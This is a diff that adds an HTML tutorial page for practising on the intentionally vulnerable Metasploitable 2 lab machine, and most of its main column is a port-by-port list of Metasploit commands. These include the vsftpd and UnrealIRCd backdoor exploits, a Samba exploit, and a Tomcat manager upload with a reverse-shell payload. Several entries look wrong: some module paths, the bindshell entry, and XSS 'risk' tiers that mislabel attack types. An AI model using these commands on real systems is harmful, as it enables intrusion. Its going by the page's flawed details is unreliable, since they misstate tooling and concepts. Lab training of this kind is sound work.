@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<title>Metasploitable Machine 2</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+* {
+  box-sizing: border-box;
+}
+
+/* Style the body */
+body {
+  font-family: Arial;
+  margin: 0;
+}
+
+/* Header/logo Title */
+.header {
+  padding: 60px;
+  text-align: center;
+  background: #1abc9c;
+  color: white;
+}
+
+/* Style the top navigation bar */
+.navbar {
+  display: flex;
+  flex-wrap: wrap;
+  background-color: #333;
+}
+
+/* Navigation bar links */
+.navbar a {
+  color: white;
+  padding: 14px 20px;
+  text-decoration: none;
+  text-align: center;
+}
+
+/* Toggle button for mobile */
+.navbar .toggle {
+  display: none;
+  background-color: #333;
+  color: white;
+  padding: 14px 20px;
+  cursor: pointer;
+}
+
+/* Change color on hover */
+.navbar a:hover {
+  background-color: #ddd;
+  color: black;
+}
+
+/* Toggle menu display */
+.navbar .menu {
+  display: flex;
+  flex-direction: row;
+}
+
+/* Responsive layout - when the screen is less than 700px wide */
+@media (max-width: 700px) {
+  .navbar .menu {
+    display: none;
+    flex-direction: column;
+  }
+  .navbar .toggle {
+    display: block;
+  }
+  .navbar.active .menu {
+    display: flex;
+  }
+}
+
+/* Column container */
+.row {
+  display: flex;
+  flex-wrap: wrap;
+}
+
+/* Sidebar/left column */
+.side {
+  flex: 30%;
+  background-color: #f1f1f1;
+  padding: 20px;
+}
+
+/* Main column */
+.main {
+  flex: 70%;
+  background-color: white;
+  padding: 20px;
+}
+
+/* Fake image, just for this example */
+.fakeimg {
+  background-color: #aaa;
+  width: 100%;
+  padding: 20px;
+}
+
+/* Footer */
+.footer {
+  padding: 20px;
+  text-align: center;
+  background: #ddd;
+}
+
+/* Responsive layout - when the screen is less than 700px wide */
+@media (max-width: 700px) {
+  .row, .navbar {   
+    flex-direction: column;
+  }
+}
+
+/* Animation for navbar links */
+.navbar a {
+  transition: background-color 0.3s, color 0.3s;
+}
+</style>
+</head>
+<body>
+
+<!-- Header -->
+<div class="header">
+  <h1>Metasploitable Machine 2</h1>
+  <p>Explore and practice ethical hacking techniques with Metasploitable 2.</p>
+</div>
+
+<!-- Navigation Bar -->
+<div class="navbar">
+  <span class="toggle" onclick="toggleNavbar()">☰ Menu</span>
+  <div class="menu">
+    <a href="#">Home</a>
+    <a href="#">About</a>
+    <a href="#">Features</a>
+    <a href="#">XSS Vulnerabilities</a>
+    <a href="#">Setup Guide</a>
+    <a href="#">Exploitation</a>
+    <a href="#">Commands</a>
+    <a href="#">Contact</a>
+  </div>
+</div>
+
+<!-- The flexible grid (content) -->
+<div class="row">
+  <div class="side">
+    <h2>About Metasploitable 2</h2>
+    <p>Metasploitable 2 is a vulnerable virtual machine designed for testing and developing security tools. It provides a controlled environment where you can safely practice penetration testing techniques without harming actual systems.</p>
+    <h3>Key Features:</h3>
+    <ul>
+      <li>Intentionally vulnerable to various exploits.</li>
+      <li>Includes a variety of services and applications for testing.</li>
+      <li>Ideal for practicing with the Metasploit Framework.</li>
+    </ul>
+    <h3>Setup Guide</h3>
+    <p>Follow these steps to set up Metasploitable 2:</p>
+    <ol>
+      <li>Download the Metasploitable 2 VM image from the official source.</li>
+      <li>Import the image into your virtual machine software (e.g., VirtualBox or VMware).</li>
+      <li>Start the virtual machine and configure network settings as needed.</li>
+      <li>Use the Metasploit Framework or other security tools to explore and test the machine.</li>
+    </ol>
+    <h3>How to Exploit Metasploitable 2</h3>
+    <p>To exploit Metasploitable 2, follow these steps:</p>
+    <ol>
+      <li>Use scanning tools like Nmap to identify open ports and services.</li>
+      <li>Leverage the Metasploit Framework to find and exploit vulnerabilities.</li>
+      <li>Practice different attack techniques, such as SQL injection and XSS.</li>
+    </ol>
+  </div>
+  <div class="main">
+    <h2>Understanding XSS Vulnerabilities</h2>
+    <h5>Types of XSS Vulnerabilities:</h5>
+    <ul>
+      <li><strong>Low Risk:</strong> Basic reflection XSS where user input is reflected in the output without sanitization.</li>
+      <li><strong>Medium Risk:</strong> Stored XSS where malicious input is stored on the server and executed when retrieved.</li>
+      <li><strong>High Risk:</strong> DOM-based XSS where the vulnerability exists in the client-side code and can manipulate the DOM.</li>
+      <li><strong>Critical Risk:</strong> Complex XSS attacks that can bypass common defenses and lead to severe consequences.</li>
+    </ul>
+    <h3>Number and Types of Vulnerabilities in Metasploitable 2</h3>
+    <p>Metasploitable 2 contains numerous vulnerabilities, including:</p>
+    <ul>
+      <li>XSS</li>
+      <li>SQL Injection</li>
+      <li>Remote Code Execution</li>
+      <li>Misconfigured Services</li>
+      <li>Weak Passwords</li>
+    </ul>
+    <p>Total vulnerabilities: Over 50 known vulnerabilities in various services and applications.</p>
+    <div class="fakeimg" style="height:200px;">Image</div>
+    
+    <h2>Metasploit Exploitation Commands</h2>
+    <h5>FTP (vsftpd 2.3.4) - Port 21</h5>
+    <pre><code>use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS [target IP]
+run</code></pre>
+    
+    <h5>SSH (OpenSSH 4.7p1) - Port 22</h5>
+    <pre><code>use exploit/unix/ssh/sshexec
+set RHOSTS [target IP]
+set USERNAME [username]
+set PASSWORD [password]
+run</code></pre>
+    
+    <h5>Telnet (Linux telnetd) - Port 23</h5>
+    <p>Telnet typically does not have a specific Metasploit module; it may require manual exploitation or other tools.</p>
+    
+    <h5>SMTP (Postfix smtpd) - Port 25</h5>
+    <pre><code>use auxiliary/scanner/smtp/smtp_version
+set RHOSTS [target IP]
+run</code></pre>
+    
+    <h5>DNS (ISC BIND 9.4.2) - Port 53</h5>
+    <pre><code>use auxiliary/scanner/dns/dns_enum
+set RHOSTS [target IP]
+run</code></pre>
+    
+    <h5>HTTP (Apache httpd 2.2.8) - Port 80</h5>
+    <pre><code>use auxiliary/scanner/http/http_version
+set RHOSTS [target IP]
+run</code></pre>
+    
+    <h5>RPC (rpcbind) - Port 111</h5>
+    <pre><code>use auxiliary/scanner/rpc/rpcinfo
+set RHOSTS [target IP]
+run</code></pre>
+    
+    <h5>NetBIOS (Samba smbd) - Ports 139 & 445</h5>
+    <pre><code>use auxiliary/scanner/smb/smb_version
+set RHOSTS [target IP]
+run
+use exploit/linux/samba/is_known_pipename
+set RHOSTS [target IP]
+run</code></pre>
+    
+    <h5>Remote Execution (netkit-rsh rexecd) - Port 512</h5>
+    <pre><code>use exploit/unix/remote/exec
+set RHOSTS [target IP]
+set USERNAME [username]
+set PASSWORD [password]
+run</code></pre>
+    
+    <h5>Login (unknown service) - Port 513</h5>
+    <p>This service may need manual testing or might not have a specific Metasploit module.</p>
+    
+    <h5>Shell (unknown service) - Port 514</h5>
+    <p>Similar to port 513, it may require manual exploitation or other tools.</p>
+    
+    <h5>Java RMI (GNU Classpath grmiregistry) - Port 1099</h5>
+    <pre><code>use exploit/multi/misc/java_rmi_server
+set RHOSTS [target IP]
+run</code></pre>
+    
+    <h5>Bindshell (Metasploitable root shell) - Port 1524</h5>
+    <pre><code>use exploit/multi/handler
+set PAYLOAD linux/x86/shell/reverse_tcp
+set LHOST [your IP]
+set LPORT [your port]
+run</code></pre>
+    
+    <h5>NFS (RPC #100003) - Port 2049</h5>
+    <pre><code>use auxiliary/scanner/nfs/nfs_showmount
+set RHOSTS [target IP]
+run</code></pre>
+    
+    <h5>CCProxy FTP - Port 2121</h5>
+    <p>May require manual testing or a less common exploit.</p>
+    
+    <h5>MySQL (MySQL 5.0.51a) - Port 3306</h5>
+    <pre><code>use auxiliary/scanner/mysql/mysql_version
+set RHOSTS [target IP]
+run</code></pre>
+    
+    <h5>PostgreSQL (PostgreSQL DB 8.3.0) - Port 5432</h5>
+    <pre><code>use auxiliary/scanner/postgres/postgres_version
+set RHOSTS [target IP]
+run</code></pre>
+    
+    <h5>VNC (VNC protocol 3.3) - Port 5900</h5>
+    <pre><code>use auxiliary/scanner/vnc/vnc_login
+set RHOSTS [target IP]
+set USERNAME [username]
+set PASSWORD [password]
+run</code></pre>
+    
+    <h5>X11 (access denied) - Port 6000</h5>
+    <pre><code>use auxiliary/scanner/x11/x11_login
+set RHOSTS [target IP]
+run</code></pre>
+    
+    <h5>IRC (UnrealIRCd) - Port 6667</h5>
+    <pre><code>use exploit/unix/irc/unreal_ircd_3281_backdoor
+set RHOSTS [target IP]
+run</code></pre>
+    
+    <h5>AJP13 (Apache Jserv) - Port 8009</h5>
+    <pre><code>use exploit/multi/http/ajp13
+set RHOSTS [target IP]
+run</code></pre>
+    
+    <h5>Apache Tomcat/Coyote JSP engine 1.1 - Port 8180</h5>
+    <pre><code>use exploit/multi/http/tomcat_mgr_deploy
+set RHOSTS [target IP]
+set TARGETURI /manager/html
+set PAYLOAD java/meterpreter/reverse_tcp
+set LHOST [your IP]
+run</code></pre>
+  </div>
+</div>
+
+<!-- Footer -->
+<div class="footer">
+  <h2>Footer</h2>
+</div>
+
+<script>
+function toggleNavbar() {
+  document.querySelector('.navbar').classList.toggle('active');
+}
+</script>
+
+</body>
+</html>
